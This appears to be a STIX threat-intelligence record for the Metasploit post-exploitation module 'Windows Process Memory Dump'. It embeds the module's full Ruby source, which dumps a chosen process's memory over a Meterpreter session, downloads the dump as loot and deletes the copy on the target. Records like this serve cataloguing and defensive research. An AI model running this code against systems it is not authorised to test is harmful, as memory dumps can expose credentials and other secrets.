{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--10b33b2c-231e-47a2-b06a-357e0325821b",
    "created": "2024-08-14T16:33:05.029984Z",
    "modified": "2024-08-14T16:33:05.029988Z",
    "name": "Windows Process Memory Dump",
    "description": " This module creates a memory dump of a process (to disk) and downloads the file for offline analysis.  Options for DUMP_TYPE affect the completeness of the dump:  \"full\" retrieves the entire process address space (all allocated pages); \"standard\" excludes image files (e.g. DLLs and EXEs in the address space) as well as memory mapped files. As a result, this option can be significantly smaller in size.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/memory_dump.rb",
            "external_id": "memory_dump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Process Memory Dump',\n        'Description' => %q{\n          This module creates a memory dump of a process (to disk) and downloads the file\n          for offline analysis.\n\n          Options for DUMP_TYPE affect the completeness of the dump:\n\n          \"full\" retrieves the entire process address space (all allocated pages);\n          \"standard\" excludes image files (e.g. DLLs and EXEs in the address space) as\n          well as memory mapped files. As a result, this option can be significantly\n          smaller in size.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['smashery'],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_delete_file\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptInt.new('PID', [false, 'ID of the process to dump memory from']),\n      OptString.new('PROCESS_NAME', [false, 'Name of the process(es) to dump memory from']),\n      OptString.new('DUMP_PATH', [false, 'File to write memory dump to']),\n      OptEnum.new('DUMP_TYPE', [ true, 'Minidump size', 'standard', ['standard', 'full']])\n    ])\n  end\n\n  def get_process_handle(pid)\n    result = session.railgun.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)\n    error = result['GetLastError']\n    unless error == 0\n      fail_with(Msf::Module::Failure::PayloadFailed, \"Unable to open process: #{result['ErrorMessage']}\")\n    end\n    result['return']\n  end\n\n  def create_file(path)\n    result = session.railgun.kernel32.CreateFileW(\n      path,\n      'GENERIC_READ | GENERIC_WRITE',\n      0,\n      nil,\n      'CREATE_ALWAYS',\n      0,\n      0\n    )\n    error = result['GetLastError']\n    unless error == 0\n      fail_with(Msf::Module::Failure::PayloadFailed, \"Unable to create file: #{result['ErrorMessage']}\")\n    end\n    result['return']\n  end\n\n  def dump_process(pid)\n    process = client.sys.process.processes.select { |p| p['pid'] == pid }.flatten.first\n\n    fail_with(Msf::Module::Failure::PayloadFailed, \"Could not find process #{pid}\") unless process\n\n    name = process['name'].to_s\n    path = datastore['DUMP_PATH'] || \"#{session.sys.config.getenv('TEMP')}\\\\#{Rex::Text.rand_text_alpha(8..14)}\"\n\n    print_status(\"Dumping memory for #{name} (pid: #{pid}) to #{path}\")\n\n    if datastore['DUMP_TYPE'] == 'standard'\n      # MiniDumpWithDataSegs | MiniDumpWithHandleData | MiniDumpWithIndirectlyReferencedMemory\n      # | MiniDumpWithProcessThreadData | MiniDumpWithPrivateReadWriteMemory | MiniDumpWithThreadInfo\n      dump_flags = 0x1 | 0x4 | 0x40 | 0x100 | 0x200 | 0x1000\n    elsif datastore['DUMP_TYPE'] == 'full'\n      # MiniDumpWithFullMemory\n      dump_flags = 0x2\n    end\n\n    process_handle = nil\n    file_handle = nil\n    begin\n      process_handle = get_process_handle(pid)\n      file_handle = create_file(path)\n      result = session.railgun.dbghelp.MiniDumpWriteDump(\n        process_handle,\n        pid,\n        file_handle,\n        dump_flags,\n        nil,\n        nil,\n        nil\n      )\n      unless result['return']\n        fail_with(Msf::Module::Failure::PayloadFailed, \"Minidump failed: #{result['ErrorMessage']}\")\n      end\n    ensure\n      session.railgun.kernel32.CloseHandle(process_handle) if process_handle\n      session.railgun.kernel32.CloseHandle(file_handle) if file_handle\n    end\n\n    download_dump(path)\n  end\n\n  def download_dump(path)\n    loot_path = store_loot('windows.process.dump', 'application/octet-stream', session, '')\n    src_stat = client.fs.filestat.new(path)\n    print_status(\"Downloading minidump (#{Filesize.new(src_stat.size).pretty})\")\n    session.fs.file.download_file(loot_path, path)\n    print_good(\"Memory dump stored at #{loot_path}\")\n  ensure\n    print_status('Deleting minidump from disk')\n    session.fs.file.delete(path)\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Only meterpreter sessions are supported by this module') unless session.type == 'meterpreter'\n\n    if datastore['PID'] && datastore['PROCESS_NAME']\n      fail_with(Failure::BadConfig, 'PROCESS_NAME and PID are mutually exclusive.')\n    end\n\n    unless datastore['PID'] || datastore['PROCESS_NAME']\n      fail_with(Failure::BadConfig, 'PROCESS_NAME or PID must be set.')\n    end\n\n    print_status(\"Running module against #{sysinfo['Computer']} (#{session.session_host})\")\n\n    if datastore['PROCESS_NAME']\n      pids = pidof(datastore['PROCESS_NAME'])\n      fail_with(Failure::BadConfig, \"Could not find PID for process '#{datastore['PROCESS_NAME']}'\") if pids.empty?\n    else\n      pids = [datastore['PID']]\n    end\n\n    session_pid = session.sys.process.getpid\n\n    pids.uniq.each do |pid|\n      if pid == session_pid && !datastore['ForceExploit']\n        print_warning(\"Skipping process #{pid}. Dumping current process is not recommended (can result in deadlock). To run anyway, set ForceExploit to True\")\n        next\n      end\n\n      dump_process(pid)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}